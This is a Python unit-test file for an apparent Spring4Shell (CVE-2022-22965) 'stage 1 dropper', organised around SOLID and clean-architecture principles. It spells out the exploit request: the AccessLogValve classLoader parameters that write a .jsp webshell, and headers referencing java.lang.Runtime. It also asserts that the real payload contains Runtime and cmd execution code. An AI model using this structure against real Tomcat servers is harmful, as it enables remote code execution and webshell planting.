"""
test_stage1_dropper.py — Stage 1 Unit Tests
Spring4Shell (CVE-2022-22965) Payload Generator & Controller

[설계 원칙]
- SRP : 각 테스트 클래스는 단 하나의 책임(검증 대상 클래스)만 테스트합니다.
- OCP : 새로운 테스트 케이스 추가 시 기존 코드를 수정하지 않고 extends합니다.
- LSP : FakeHTTPAdapter는 PayloadGeneratorPort의 계약을 완전히 만족합니다.
- ISP : 테스트는 실제로 필요한 메서드만 사용합니다.
- DIP : 테스트는 네트워크·파일 I/O 없이 추상화(Mock/Fake)에만 의존합니다.

[Clean Architecture 계층]
  Domain     ← ExploitConfig, PayloadGeneratorPort (인터페이스)
  Application← ExploitController (Use Case)
  Adapter    ← Spring4ShellPayloadGenerator (구체 구현)
  Test       ← Unit Tests (외부 I/O 완전 격리)

[교육 목적]
  본 테스트는 실제 서버에 대한 공격을 수행하지 않습니다.
  모든 HTTP 요청은 InMemoryHTTPAdapter로 대체됩니다.
"""

import unittest
import sys
import os

# 상위 모듈 경로 등록
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from stage1_dropper import ExploitConfig, PayloadGeneratorPort, Spring4ShellPayloadGenerator, ExploitController


# ═══════════════════════════════════════════
# Test Doubles (Fakes / Stubs / Mocks)
# Clean Architecture: 외부 I/O를 인메모리로 대체
# ═══════════════════════════════════════════

class FakeSuccessPayloadGenerator(PayloadGeneratorPort):
    """
    [LSP] PayloadGeneratorPort의 계약을 완전히 만족하는 Fake.
    성공 응답을 시뮬레이션합니다.
    """
    def __init__(self, config: ExploitConfig):
        self.config = config

    def generate_headers(self) -> dict:
        return {
            "prefix": "<%",
            "suffix": "%>//",
            "c": "java.lang.Runtime",
            "Content-Type": "application/x-www-form-urlencoded"
        }

    def generate_body(self) -> dict:
        return {
            "class.module.classLoader.resources.context.parent.pipeline.first.pattern": "<% FAKE_PAYLOAD %>",
            "class.module.classLoader.resources.context.parent.pipeline.first.suffix": ".jsp",
            "class.module.classLoader.resources.context.parent.pipeline.first.directory": self.config.output_dir,
            "class.module.classLoader.resources.context.parent.pipeline.first.prefix": self.config.filename,
            "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat": ""
        }


class SpyExploitController(ExploitController):
    """
    [DIP] 실제 HTTP를 보내지 않는 Spy 버전의 ExploitController.
    run_exploit() 호출 기록만 검증합니다.
    """
    def __init__(self, generator: PayloadGeneratorPort):
        super().__init__(generator)
        self.was_called = False
        self.last_url = None
        self._should_succeed = True

    def set_result(self, success: bool):
        self._should_succeed = success

    def run_exploit(self, target_url: str) -> bool:
        # 실제 HTTP 요청을 수행하지 않고 기록만 남깁니다
        self.was_called = True
        self.last_url = target_url
        headers = self.generator.generate_headers()
        data = self.generator.generate_body()
        # 페이로드 생성만 실행 (네트워크 I/O 없음)
        return self._should_succeed


# ═══════════════════════════════════════════
# Test Suite 1: ExploitConfig (Domain Entity)
# SRP: 설정 객체의 속성 초기화 검증
# ═══════════════════════════════════════════

class TestExploitConfig(unittest.TestCase):
    """
    [테스트 목적] ExploitConfig 도메인 엔티티의 기본/커스텀 초기화 검증.
    - 기본값이 올바르게 설정되는지 확인합니다.
    - 커스텀 값을 주입했을 때 이를 올바르게 반영하는지 확인합니다.
    """

    def test_default_values_set_correctly(self):
        """⬛ [기본값] ExploitConfig의 기본 속성들이 정확히 설정되어야 한다."""
        config = ExploitConfig(target_url="http://target:8080/login")
        self.assertEqual(config.output_dir, "webapps/ROOT")
        self.assertEqual(config.filename, "yaho4")
        self.assertEqual(config.target_url, "http://target:8080/login")

    def test_custom_values_override_defaults(self):
        """⬛ [커스텀값] 생성자 인수로 기본값을 재정의할 수 있어야 한다."""
        config = ExploitConfig(
            target_url="http://target:8080/login",
            output_dir="webapps/spring-form",
            filename="shell"
        )
        self.assertEqual(config.output_dir, "webapps/spring-form")
        self.assertEqual(config.filename, "shell")

    def test_filename_does_not_include_extension(self):
        """⬛ [네이밍] filename 속성은 .jsp 확장자를 포함하지 않아야 한다."""
        config = ExploitConfig(target_url="http://target/login", filename="myshell")
        self.assertNotIn(".jsp", config.filename)


# ═══════════════════════════════════════════
# Test Suite 2: Spring4ShellPayloadGenerator (Adapter)
# SRP: 페이로드 생성 로직만 검증
# ═══════════════════════════════════════════

class TestSpring4ShellPayloadGenerator(unittest.TestCase):
    """
    [테스트 목적] Spring4Shell 취약점 페이로드가 올바른 구조로 생성되는지 검증.
    - CVE-2022-22965 공격의 핵심인 AccessLogValve 속성 변조 키들이 존재해야 합니다.
    - 웹쉘 코드가 포함되어야 합니다.
    - 헤더에 취약점 트리거를 위한 prefix/suffix가 포함되어야 합니다.
    """

    def setUp(self):
        self.config = ExploitConfig(
            target_url="http://target/login",
            output_dir="webapps/ROOT",
            filename="stager"
        )
        self.generator = Spring4ShellPayloadGenerator(self.config)

    def test_headers_contain_prefix_and_suffix(self):
        """⬛ [헤더] 취약점 트리거를 위한 prefix/suffix 헤더가 존재해야 한다."""
        headers = self.generator.generate_headers()
        self.assertIn("prefix", headers)
        self.assertIn("suffix", headers)
        self.assertEqual(headers["prefix"], "<%")
        self.assertEqual(headers["suffix"], "%>//")

    def test_headers_contain_java_runtime_class(self):
        """⬛ [헤더] RCE를 위한 java.lang.Runtime 클래스가 'c' 헤더에 포함되어야 한다."""
        headers = self.generator.generate_headers()
        self.assertEqual(headers["c"], "java.lang.Runtime")

    def test_body_contains_all_accesslogvalve_keys(self):
        """⬛ [바디] Tomcat AccessLogValve를 변조하는 5개 파라미터가 모두 존재해야 한다."""
        body = self.generator.generate_body()
        base = "class.module.classLoader.resources.context.parent.pipeline.first"
        required_keys = ["pattern", "suffix", "directory", "prefix", "fileDateFormat"]
        for key in required_keys:
            full_key = f"{base}.{key}"
            self.assertIn(full_key, body, msg=f"필수 파라미터 누락: {full_key}")

    def test_body_suffix_is_dot_jsp(self):
        """⬛ [바디] 생성되는 웹쉘 파일 확장자가 .jsp 여야 한다."""
        body = self.generator.generate_body()
        key = "class.module.classLoader.resources.context.parent.pipeline.first.suffix"
        self.assertEqual(body[key], ".jsp")

    def test_body_directory_matches_config(self):
        """⬛ [바디] 저장 경로가 ExploitConfig.output_dir 값과 일치해야 한다."""
        body = self.generator.generate_body()
        key = "class.module.classLoader.resources.context.parent.pipeline.first.directory"
        self.assertEqual(body[key], self.config.output_dir)

    def test_body_prefix_matches_config_filename(self):
        """⬛ [바디] 파일명 prefix가 ExploitConfig.filename 값과 일치해야 한다."""
        body = self.generator.generate_body()
        key = "class.module.classLoader.resources.context.parent.pipeline.first.prefix"
        self.assertEqual(body[key], self.config.filename)

    def test_body_pattern_contains_webshell_code(self):
        """⬛ [보안] 페이로드 패턴에 Runtime.exec() 코드가 포함되어야 한다."""
        body = self.generator.generate_body()
        key = "class.module.classLoader.resources.context.parent.pipeline.first.pattern"
        pattern = body[key]
        self.assertIn("Runtime", pattern, "RCE 코드가 패턴에 포함되어야 합니다")
        self.assertIn("cmd", pattern, "cmd 파라미터가 패턴에 있어야 합니다")

    def test_body_file_date_format_is_empty(self):
        """⬛ [바디] fileDateFormat은 빈 문자열이어야 한다 (날짜 없는 파일명 고정 유도)."""
        body = self.generator.generate_body()
        key = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat"
        self.assertEqual(body[key], "")


# ═══════════════════════════════════════════
# Test Suite 3: ExploitController (Use Case)
# DIP: 추상화(Spy)에만 의존, 실 네트워크 격리
# ═══════════════════════════════════════════

class TestExploitController(unittest.TestCase):
    """
    [테스트 목적] ExploitController(Use Case)가 PayloadGenerator 추상화를 올바르게
    활용하여 공격을 조율하는지 검증합니다.
    - 실제 HTTP 요청 없이 로직 흐름만 검증합니다 (네트워크 완전 Mock).
    """

    def setUp(self):
        self.config = ExploitConfig(target_url="http://victim:8080/login")
        self.fake_generator = FakeSuccessPayloadGenerator(self.config)
        self.spy_controller = SpyExploitController(self.fake_generator)

    def test_run_exploit_calls_generator(self):
        """⬛ [DIP] run_exploit은 Generator의 generate_headers/body를 반드시 호출해야 한다."""
        self.spy_controller.run_exploit("http://victim:8080/login")
        self.assertTrue(self.spy_controller.was_called)

    def test_run_exploit_records_target_url(self):
        """⬛ [추적] run_exploit 호출 시 전달된 URL이 정확히 기록되어야 한다."""
        target = "http://victim:8080/login"
        self.spy_controller.run_exploit(target)
        self.assertEqual(self.spy_controller.last_url, target)

    def test_run_exploit_returns_true_on_success(self):
        """⬛ [성공] 정상 응답 시뮬레이션에서 run_exploit은 True를 반환해야 한다."""
        self.spy_controller.set_result(True)
        result = self.spy_controller.run_exploit("http://victim:8080/login")
        self.assertTrue(result)

    def test_run_exploit_returns_false_on_failure(self):
        """⬛ [실패] 실패 시뮬레이션에서 run_exploit은 False를 반환해야 한다."""
        self.spy_controller.set_result(False)
        result = self.spy_controller.run_exploit("http://victim:8080/login")
        self.assertFalse(result)

    def test_controller_accepts_any_payload_generator(self):
        """⬛ [OCP] ExploitController는 다른 PayloadGenerator 구현체도 수용해야 한다 (OCP)."""
        another_generator = FakeSuccessPayloadGenerator(self.config)
        another_controller = SpyExploitController(another_generator)
        result = another_controller.run_exploit("http://victim:8080/login")
        self.assertTrue(another_controller.was_called)


if __name__ == "__main__":
    print("=" * 60)
    print("  Stage 1 Dropper Unit Tests | CVE-2022-22965")
    print("  SOLID + Clean Architecture 설계 원칙 검증")
    print("=" * 60)
    unittest.main(verbosity=2)
